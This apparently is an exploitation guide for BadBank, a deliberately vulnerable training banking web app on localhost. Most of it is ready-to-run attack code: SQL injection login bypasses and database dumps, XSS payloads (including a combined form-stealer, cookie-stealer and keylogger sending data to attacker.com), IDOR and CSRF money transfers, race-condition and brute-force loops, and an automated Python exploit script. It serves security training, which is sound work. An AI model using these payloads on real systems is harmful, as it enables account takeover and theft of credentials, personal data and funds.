# BadBank Exploitation Guide

This document provides practical exploitation examples for all vulnerabilities in BadBank.

## Table of Contents
1. [Setup and Prerequisites](#setup-and-prerequisites)
2. [SQL Injection Exploits](#sql-injection-exploits)
3. [Cross-Site Scripting (XSS) Exploits](#cross-site-scripting-xss-exploits)
4. [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor)
5. [Business Logic Exploits](#business-logic-exploits)
6. [Authentication Bypasses](#authentication-bypasses)
7. [Information Disclosure](#information-disclosure)
8. [CSRF Exploits](#csrf-exploits)

---

## Setup and Prerequisites

**Target URL:** `http://localhost:5000`  
**Tools Required:** curl, browser, Burp Suite (optional)  
**Test Accounts:**
- alice / password123 (User ID: 1)
- bob / password123 (User ID: 2)
- charlie / password123 (User ID: 3)

---

## SQL Injection Exploits

### 1. Authentication Bypass

**Vulnerability:** Login form uses string concatenation for SQL queries

**Basic Bypass:**
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1' --" \
  -d "password=anything" \
  -c cookies.txt
```

**Union-based Data Extraction:**
```bash
# Extract user data
curl -X POST http://localhost:5000/login \
  -d "username=admin' UNION SELECT id,username,email,password_hash,full_name,phone,address,created_at FROM users --" \
  -d "password=anything"
```

**Database Schema Discovery:**
```bash
# Get table names
curl -X POST http://localhost:5000/login \
  -d "username=admin' UNION SELECT name,sql,type,tbl_name,rootpage,sql,sql,sql FROM sqlite_master WHERE type='table' --" \
  -d "password=anything"
```

**Complete Database Dump:**
```bash
# Dump all users
curl -X POST http://localhost:5000/login \
  -d "username=admin' UNION SELECT id||':'||username||':'||password_hash||':'||email,username,email,password_hash,full_name,phone,address,created_at FROM users --" \
  -d "password=anything"
```

---

## Cross-Site Scripting (XSS) Exploits

### 2. Stored XSS in Transaction Descriptions

**Basic Alert Payload:**
```bash
# Login first
curl -X POST http://localhost:5000/login \
  -d "username=alice" \
  -d "password=password123" \
  -c cookies.txt

# Send malicious transaction
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=1.00" \
  -d "description=<script>alert('Stored XSS')</script>"
```

**Session Hijacking Payload:**
```bash
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=1.00" \
  -d "description=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>"
```

**Keylogger Payload:**
```bash
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=1.00" \
  -d "description=<script>document.addEventListener('keypress',function(e){fetch('http://attacker.com/keys?key='+e.key)})</script>"
```

### 3. Reflected XSS in Password Reset

**Basic Reflected XSS:**
```bash
curl "http://localhost:5000/reset-password?message=<script>alert('Reflected XSS')</script>"
```

**Cookie Stealing:**
```bash
curl "http://localhost:5000/reset-password?message=<script>location='http://attacker.com/steal?cookie='+document.cookie</script>"
```

**Phishing Form Injection:**
```bash
curl "http://localhost:5000/reset-password?message=<form action='http://attacker.com/phish' method='post'>New Password: <input type='password' name='pass'><input type='submit' value='Update'></form>"
```

### 4. DOM-based XSS

**URL Parameter Exploitation:**
```
http://localhost:5000/dashboard?welcome=<img src=x onerror=alert('DOM XSS')>
```

**Hash Fragment Exploitation:**
```
http://localhost:5000/dashboard#<script>alert('Hash XSS')</script>
```

**Advanced DOM XSS:**
```
http://localhost:5000/dashboard?welcome=<svg onload=eval(atob('YWxlcnQoJ0RPTSBYU1MnKQ=='))>
```

---

## Insecure Direct Object Reference (IDOR)

### 5. IDOR in Money Transfers

**Transfer from Another User's Account:**
```bash
# Login as bob
curl -X POST http://localhost:5000/login \
  -d "username=bob" \
  -d "password=password123" \
  -c cookies.txt

# Transfer money from alice's account (User ID: 1)
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=1000.00" \
  -d "sender_user_id=1" \
  -d "description=Unauthorized transfer"
```

### 6. IDOR in Transaction History

**View Another User's Transactions:**
```bash
# Login as any user
curl -X POST http://localhost:5000/login \
  -d "username=bob" \
  -d "password=password123" \
  -c cookies.txt

# View alice's transactions (User ID: 1)
curl -b cookies.txt "http://localhost:5000/transactions?user_id=1"

# View charlie's transactions (User ID: 3)
curl -b cookies.txt "http://localhost:5000/transactions?user_id=3"
```

---

## Business Logic Exploits

### 7. Negative Balance Exploit

**Create Unlimited Negative Balance:**
```bash
# Login as alice
curl -X POST http://localhost:5000/login \
  -d "username=alice" \
  -d "password=password123" \
  -c cookies.txt

# Transfer more money than available
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=999999.99" \
  -d "description=Overdraft exploit"
```

### 8. Race Condition Exploit

**Double Spending Attack:**
```bash
# Create multiple simultaneous transfers
for i in {1..10}; do
  curl -X POST http://localhost:5000/transfer \
    -b cookies.txt \
    -d "recipient_account=1001-2002-3002" \
    -d "amount=100.00" \
    -d "description=Race condition $i" &
done
wait
```

---

## Authentication Bypasses

### 9. Brute Force Attack

**Username Enumeration:**
```bash
# Test common usernames
for user in admin root administrator test guest; do
  echo "Testing: $user"
  curl -X POST http://localhost:5000/login \
    -d "username=$user" \
    -d "password=test123" \
    -w "%{http_code}\n" -o /dev/null -s
done
```

**Password Brute Force:**
```bash
# Brute force alice's password
for pass in password password123 123456 admin alice; do
  echo "Testing password: $pass"
  curl -X POST http://localhost:5000/login \
    -d "username=alice" \
    -d "password=$pass" \
    -w "%{http_code}\n" -o /dev/null -s
done
```

---

## Information Disclosure

### 10. User Enumeration via API

**Enumerate All Users:**
```bash
# Discover users by ID
for id in {1..10}; do
  echo "Testing User ID: $id"
  curl -s "http://localhost:5000/api/user/$id" | jq .
done
```

**Extract User Information:**
```bash
# Get specific user details
curl -s "http://localhost:5000/api/user/1" | jq '{id, username, email, full_name}'
```

### 11. Database Error Information Disclosure

**Trigger SQL Errors:**
```bash
# Cause database error to reveal schema
curl -X POST http://localhost:5000/login \
  -d "username=admin' AND (SELECT COUNT(*) FROM nonexistent_table) > 0 --" \
  -d "password=anything"
```

---

## CSRF Exploits

### 12. Cross-Site Request Forgery

**Malicious HTML Page (csrf_transfer.html):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Free Money!</title>
</head>
<body>
    <h1>Click here for free money!</h1>
    
    <!-- Hidden form that transfers money -->
    <form id="malicious" action="http://localhost:5000/transfer" method="POST" style="display:none;">
        <input type="hidden" name="recipient_account" value="1001-2002-3002">
        <input type="hidden" name="amount" value="1000.00">
        <input type="hidden" name="description" value="CSRF Attack">
        <input type="hidden" name="sender_user_id" value="1">
    </form>
    
    <script>
        // Auto-submit the form
        document.getElementById('malicious').submit();
    </script>
</body>
</html>
```

**CSRF Profile Update:**
```html
<!DOCTYPE html>
<html>
<body>
    <form action="http://localhost:5000/profile" method="POST" style="display:none;">
        <input type="hidden" name="full_name" value="Hacked User">
        <input type="hidden" name="email" value="hacker@evil.com">
        <input type="hidden" name="phone" value="555-HACKED">
        <input type="hidden" name="address" value="Pwned Street">
    </form>
    
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

---

## Advanced Exploitation Chains

### 13. Complete Account Takeover Chain

**Step 1: SQL Injection to Extract Credentials**
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin' UNION SELECT id,username,password_hash,email,full_name,phone,address,created_at FROM users --" \
  -d "password=anything" > user_dump.html
```

**Step 2: Login with Extracted Credentials**
```bash
curl -X POST http://localhost:5000/login \
  -d "username=alice" \
  -d "password=password123" \
  -c cookies.txt
```

**Step 3: IDOR to Transfer Money from All Accounts**
```bash
# Transfer from user 1 (alice)
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=5000.00" \
  -d "sender_user_id=1" \
  -d "description=<script>alert('Pwned')</script>"

# Transfer from user 3 (charlie)  
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=7500.00" \
  -d "sender_user_id=3" \
  -d "description=<script>alert('Pwned')</script>"
```

### 14. Persistent XSS with Data Exfiltration

**Payload for Maximum Impact:**
```bash
curl -X POST http://localhost:5000/transfer \
  -b cookies.txt \
  -d "recipient_account=1001-2002-3002" \
  -d "amount=1.00" \
  -d "description=<script>
    // Steal all form data
    document.addEventListener('submit', function(e) {
        let formData = new FormData(e.target);
        let data = {};
        for(let [key, value] of formData.entries()) {
            data[key] = value;
        }
        fetch('http://attacker.com/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
    
    // Steal cookies
    fetch('http://attacker.com/cookies?data=' + btoa(document.cookie));
    
    // Keylogger
    document.addEventListener('keypress', function(e) {
        fetch('http://attacker.com/keys?key=' + e.key);
    });
</script>"
```

---

## Automated Exploitation Scripts

### 15. Python Exploitation Script

```python
#!/usr/bin/env python3
import requests
import json

BASE_URL = "http://localhost:5000"
session = requests.Session()

def sql_injection_login():
    """Bypass login with SQL injection"""
    data = {
        'username': "admin' OR '1'='1' --",
        'password': "anything"
    }
    response = session.post(f"{BASE_URL}/login", data=data)
    return "Welcome" in response.text

def enumerate_users():
    """Enumerate users via API"""
    users = []
    for user_id in range(1, 10):
        response = session.get(f"{BASE_URL}/api/user/{user_id}")
        if response.status_code == 200:
            users.append(response.json())
    return users

def idor_transfer(victim_id, amount):
    """Transfer money using IDOR"""
    data = {
        'recipient_account': '1001-2002-3002',
        'amount': amount,
        'sender_user_id': victim_id,
        'description': 'IDOR Exploit'
    }
    response = session.post(f"{BASE_URL}/transfer", data=data)
    return "Successfully transferred" in response.text

# Execute exploits
if sql_injection_login():
    print("[+] SQL Injection login successful")
    
users = enumerate_users()
print(f"[+] Found {len(users)} users")

for user in users:
    if idor_transfer(user['id'], 1000):
        print(f"[+] Successfully transferred money from user {user['username']}")
```

---

## Detection and Monitoring

### 16. Log Analysis Patterns

**SQL Injection Indicators:**
- Single quotes in username fields
- SQL keywords (UNION, SELECT, OR)
- Comment sequences (-- or /**/)

**XSS Indicators:**
- Script tags in form data
- JavaScript event handlers
- Base64 encoded payloads

**IDOR Indicators:**
- Mismatched user_id parameters
- Sequential ID enumeration
- Unauthorized resource access

---

## Responsible Disclosure

⚠️ **WARNING:** These exploits are for educational purposes only. Use only against BadBank or systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.

**Legal Testing Environments:**
- Local BadBank installation
- Authorized penetration testing
- Bug bounty programs
- Security training labs
